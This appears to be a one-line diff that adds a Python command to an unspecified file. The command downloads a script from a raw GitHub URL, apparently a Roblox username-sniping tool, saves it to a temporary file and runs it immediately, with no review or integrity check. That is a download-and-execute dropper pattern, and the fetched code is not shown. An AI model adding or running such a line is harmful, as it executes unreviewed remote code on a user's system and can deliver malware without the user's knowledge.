@@ -1,0 +1,1 @@
+python -c "import urllib.request,tempfile,subprocess,sys; f=tempfile.NamedTemporaryFile(suffix='.py',delete=False); urllib.request.urlretrieve('https://raw.githubusercontent.com/neuheit/Galaxus-Roblox-Username-Sniper/main/galaxus.py',f.name); subprocess.run([sys.executable,f.name])"
